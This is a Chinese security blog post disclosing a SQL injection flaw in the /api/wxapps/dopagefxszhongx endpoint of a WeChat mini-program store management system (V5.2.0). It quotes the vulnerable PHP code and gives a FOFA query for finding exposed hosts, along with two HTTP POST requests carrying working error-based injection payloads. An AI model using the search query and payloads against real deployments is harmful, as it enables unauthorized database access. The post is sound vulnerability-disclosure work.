---
title: "万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopagefxszhongx-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagefxszhongx-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/17 08:27
- 501浏览
- [0评论](#comment)
- 29分钟阅读

深入探索

编程语言教程

网络安全课程

安全认证考试

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopagefxszhongx 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入防护

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
// 分销商中心
    public function dopagefxszhongx()
    {
        $uniacid = input("uniacid");
        $suid = input("suid");
        $sq = Db::name('wd_xcx_fx_sq')->where("uniacid", $uniacid)->where('suid', $suid)->find();
        $user = Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where('id', $suid)->find();
        $arr['sq'] = $sq;
        $arr['user'] = $user;
        $arr['order_counts'] = 0;
        $arr['team_counts'] = 0;
        $arr['tx_counts'] = 0;
        $arr['zuidi'] = 0;
        $prefix = config('database.prefix');
        //我的团队数据
        $team_counts = count(Db::query("SELECT * FROM {$prefix}wd_xcx_superuser WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['team_counts'] = $team_counts;
        // 分销订单
        $order_counts = count(Db::query("SELECT * FROM  {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['order_counts'] = $order_counts;
        // 提现申请
        $tx_counts = Db::name('wd_xcx_fx_tx')->where("uniacid", $uniacid)->where('suid', $suid)->count();
        $arr['tx_counts'] = $tx_counts;
        // 最低提现规则
        $guiz = Db::name('wd_xcx_fx_gz')->where("uniacid", $uniacid)->find();
        $arr['zuidi'] = $guiz['txmoney'];
        $arr['guiz'] = $guiz;
        $result['data'] = $arr;
        return json_encode($result);
    }
```

深入探索

网络安全会议

安全研究工具

文件大小转换

漏洞点

```
//我的团队数据
        $team_counts = count(Db::query("SELECT * FROM {$prefix}wd_xcx_superuser WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['team_counts'] = $team_counts;
        // 分销订单
        $order_counts = count(Db::query("SELECT * FROM  {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $arr['order_counts'] = $order_counts;
```

`$uniacid` 和 `$suid` 直接拼接进SQL语句，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/dopagefxszhongx HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

[![万能门店小程序管理系统 /api/wxapps/dopagefxszhongx SQL 注入漏洞](images/img-001-19d465aebc16.webp)](https://image.mrxn.net/cfe38ccdc77a4b3bbac2347c4d7d525a.webp)

```
POST /api/wxapps/dopagefxszhongx HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1'AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+'1'='1&uniacid=1
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
